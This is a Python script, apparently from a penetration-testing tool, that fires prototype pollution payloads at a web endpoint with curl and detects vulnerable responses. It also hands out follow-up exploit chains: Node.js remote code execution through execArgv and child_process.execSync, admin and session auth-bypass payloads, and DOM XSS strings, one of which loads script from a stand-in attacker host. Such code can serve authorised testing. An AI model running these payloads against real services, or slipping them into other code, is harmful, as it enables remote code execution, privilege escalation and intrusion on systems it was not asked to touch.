#!/usr/bin/env python3
"""Prototype pollution exploitation chains: server-side + client-side."""

from __future__ import annotations
import json
import logging
import re
import subprocess

logger = logging.getLogger("prototype-pollution")


def _run(cmd, timeout=60, input=None):
    try:
        proc = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout, input=input)
        return proc.returncode, proc.stdout, proc.stderr
    except Exception as exc:
        return -1, "", str(exc)


PP_PAYLOADS = [
    # Classic JSON prototype pollution
    '{"__proto__": {"polluted": "yes"}}',
    '{"constructor": {"prototype": {"polluted": "yes"}}}',
    # Nested / multi-level
    '{"__proto__": {"__proto__": {"polluted": "yes"}}}',
    '{"constructor": {"prototype": {"__proto__": {"polluted": "yes"}}}}',
    # Array-based
    '[{"__proto__": {"polluted": "yes"}}]',
    '{"x": [{"__proto__": {"polluted": "yes"}}]}',
    # Status field poisoning (RCE sink with node-serialize)
    '{"__proto__": {"status": 555}}',
    # merge-style
    '{"a": {"__proto__": {"admin": true}}}',
]

QUERY_PAYLOADS = [
    "__proto__[polluted]=yes",
    "constructor[prototype][polluted]=yes",
    "__proto__.polluted=yes",
    "constructor.prototype.polluted=yes",
    "x[__proto__][polluted]=yes",
    "x[constructor][prototype][polluted]=yes",
]


def test_prototype_pollution(target: str, url: str) -> dict:
    """Test server-side prototype pollution via JSON body and query params.

    Sends pollution payloads and detects:
    1. Status code anomalies (e.g. 555 from polluted status)
    2. Reflected pollution markers
    3. Error messages revealing merge/deep-merge sinks
    """
    findings = []

    # JSON body payloads
    for payload in PP_PAYLOADS:
        rc, stdout, stderr = _run(
            [
                "curl", "-s", "-w", "\\n%{http_code}", "--max-time", "5",
                "-X", "POST", "-H", "Content-Type: application/json",
                "-d", payload, url,
            ],
            timeout=10,
        )
        body = stdout
        code = ""
        if "\n" in stdout:
            body, code = stdout.rsplit("\n", 1)
        combined = (body + stderr).lower()
        if rc == 0 and code.strip() == "555":
            findings.append(
                {
                    "type": "prototype_pollution_status",
                    "severity": "critical",
                    "detail": f"Status code 555 returned for payload: {payload}",
                }
            )
        if "polluted" in combined and ("yes" in combined or "true" in combined):
            findings.append(
                {
                    "type": "prototype_pollution_reflected",
                    "severity": "high",
                    "detail": f"Pollution marker reflected: {payload}",
                }
            )
        if "proto" in combined and ("cannot" in combined or "error" in combined or "undefined" in combined):
            findings.append(
                {
                    "type": "prototype_pollution_sink_hint",
                    "severity": "medium",
                    "detail": f"Error suggests deep-merge sink: {payload}",
                }
            )

    # Query param payloads
    sep = "&" if "?" in url else "?"
    for payload in QUERY_PAYLOADS:
        rc, stdout, stderr = _run(
            ["curl", "-s", "--max-time", "5", url + sep + payload],
            timeout=10,
        )
        combined = (stdout + stderr).lower()
        if rc == 0 and "polluted" in combined and "yes" in combined:
            findings.append(
                {
                    "type": "prototype_pollution_query",
                    "severity": "high",
                    "detail": f"Query param pollution reflected: {payload}",
                }
            )

    return {"type": "prototype_pollution", "vulnerable": len(findings) > 0, "findings": findings}


def test_pp_chain(target: str, url: str) -> dict:
    """Prototype pollution exploitation chain guidance.

    Analyzes an endpoint for known PP -> RCE / PP -> auth bypass chain feasibility
    and returns concrete next-step payloads for the most likely sinks.
    """
    chains = {
        "pp_to_rce": {
            "vuln": "If endpoint merges user JSON into objects and eval/Function/serialize runs",
            "next_payloads": [
                '{"__proto__": {"execArgv": ["--eval=require(\'child_process\').execSync(\'id\')"]}}',
                '{"__proto__": {"shell": "/proc/self/exe", "argv0": "console.log(require(\'child_process\').execSync(\'id\').toString())//"}}',
                '{"constructor": {"prototype": {"client": "true", "command": "id"}}}',
            ],
            "severity": "critical",
        },
        "pp_to_auth_bypass": {
            "vuln": "If isAdmin/role fields are read from object properties after merge",
            "next_payloads": [
                '{"__proto__": {"isAdmin": true}}',
                '{"__proto__": {"role": "admin", "admin": 1}}',
                '{"constructor": {"prototype": {"isAdmin": true, "verified": true}}}',
            ],
            "severity": "high",
        },
        "pp_to_cookie": {
            "vuln": "If session objects are merged client-side or in middleware",
            "next_payloads": [
                '{"__proto__": {"session": {"isAdmin": true}}}',
                '{"__proto__": {"user": {"role": "admin"}}}',
            ],
            "severity": "high",
        },
        "pp_to_xss": {
            "vuln": "Client-side merge (jQuery.extend, lodash.defaultsDeep) leading to DOM XSS",
            "next_payloads": [
                '__proto__[innerHTML]=<img src=x onerror=alert(1)>',
                '__proto__[src]=//evil.example.com/x.js',
                'constructor[prototype][srcdoc]=<script>alert(1)</script>',
            ],
            "severity": "medium",
        },
    }

    return {"type": "prototype_pollution_chain", "vulnerable": None, "chains": chains}
